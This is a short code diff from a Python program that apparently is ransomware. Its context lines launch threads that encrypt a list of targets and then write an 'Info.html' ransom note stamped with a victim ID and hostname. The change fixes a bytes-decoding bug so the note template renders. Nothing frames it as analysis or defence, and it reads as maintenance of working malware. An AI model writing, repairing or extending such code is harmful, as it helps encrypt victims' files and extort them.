@@ -132,7 +132,7 @@ for a in got_list:
   threading.Thread(target=got_encrypted,args=(a,)).start()
 
 with open(p + '/Info.html','w') as f:
-  f.write(crypt_hex.replace('ID_GOT',id).replace('NAME',socket.gethostname()))
+  f.write(crypt_hex.decode().replace('ID_GOT',id).replace('NAME',socket.gethostname()))
 
 with open(p + '/style.css','w') as f:
   f.write(style_hex)
